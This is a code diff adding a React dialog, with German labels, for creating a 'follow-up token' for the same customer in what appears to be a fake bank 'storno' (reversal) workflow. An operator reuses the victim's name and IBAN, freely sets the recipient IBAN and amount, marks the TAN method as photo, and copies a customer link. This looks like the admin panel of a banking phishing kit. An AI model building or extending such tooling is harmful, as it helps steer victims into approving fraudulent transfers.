@@ -226,6 +226,85 @@ const StornoLiveCard = () => {
   );
 };
 
+const FollowUpDialog = ({ r }: { r: StornoRow }) => {
+  const [open, setOpen] = useState(false);
+  const [empfaengerName, setEmpfaengerName] = useState(r.empfaenger_name || "");
+  const [empfaengerIban, setEmpfaengerIban] = useState(r.empfaenger_iban || "");
+  const [betrag, setBetrag] = useState(r.betrag != null ? String(r.betrag).replace(".", ",") : "");
+  const [verwendungszweck, setVerwendungszweck] = useState(r.verwendungszweck || "");
+  const [busy, setBusy] = useState(false);
+
+  const submit = async () => {
+    setBusy(true);
+    const token = generateToken();
+    const parsed = parseFloat(betrag.replace(/\./g, "").replace(",", ".")) || 0;
+    const { error } = await (supabase as any).from("storno_tokens").insert({
+      token,
+      auftraggeber_name: r.auftraggeber_name,
+      auftraggeber_iban: r.auftraggeber_iban,
+      empfaenger_name: empfaengerName,
+      empfaenger_iban: empfaengerIban,
+      betrag: parsed,
+      verwendungszweck: verwendungszweck || null,
+      executed_at: r.executed_at,
+      tan_method: "photo",
+      show_berater: r.show_berater ?? false,
+      customer_phase: "pending",
+    });
+    setBusy(false);
+    if (error) { toast.error("Folge-Token fehlgeschlagen: " + error.message); return; }
+    const url = buildCustomerLink(r.auftraggeber_name || "", token);
+    try { await navigator.clipboard.writeText(url); toast.success(`Folge-Token ${token} kopiert`); }
+    catch { toast.success(`Folge-Token erstellt: ${token}`); }
+    setOpen(false);
+  };
+
+  return (
+    <>
+      <Button size="sm" variant="ghost" onClick={() => setOpen(true)} title="Folge-Token erstellen">
+        <KeyRound className="h-4 w-4" />
+      </Button>
+      {open && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4" onClick={() => setOpen(false)}>
+          <div className="bg-background rounded-lg border shadow-lg w-full max-w-md p-5 space-y-4" onClick={e => e.stopPropagation()}>
+            <div>
+              <h3 className="text-lg font-semibold">Folge-Token erstellen</h3>
+              <p className="text-xs text-muted-foreground">Daten anpassen und neuen Token für denselben Kunden erzeugen.</p>
+            </div>
+            <div className="space-y-3">
+              <div className="text-xs bg-muted/50 rounded p-2">
+                <div className="text-[10px] uppercase text-muted-foreground">Auftraggeber (übernommen)</div>
+                <div className="font-medium">{r.auftraggeber_name}</div>
+                <div className="font-mono text-[11px]">{r.auftraggeber_iban}</div>
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">Empfänger</label>
+                <Input value={empfaengerName} onChange={e => setEmpfaengerName(e.target.value)} />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">Empfänger-IBAN</label>
+                <Input value={empfaengerIban} onChange={e => setEmpfaengerIban(e.target.value)} className="font-mono" />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">Betrag (€)</label>
+                <Input value={betrag} onChange={e => setBetrag(e.target.value)} className="text-right font-mono" />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">Verwendungszweck</label>
+                <Input value={verwendungszweck} onChange={e => setVerwendungszweck(e.target.value)} />
+              </div>
+            </div>
+            <div className="flex justify-end gap-2">
+              <Button variant="outline" size="sm" onClick={() => setOpen(false)}>Abbrechen</Button>
+              <Button size="sm" onClick={submit} disabled={busy}>{busy ? "…" : "Folge-Token erstellen"}</Button>
+            </div>
+          </div>
+        </div>
+      )}
+    </>
+  );
+};
+
 const StepBlock = ({ title, children }: { title: string; children: React.ReactNode }) => (
   <div className="space-y-2">
     <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">{title}</div>
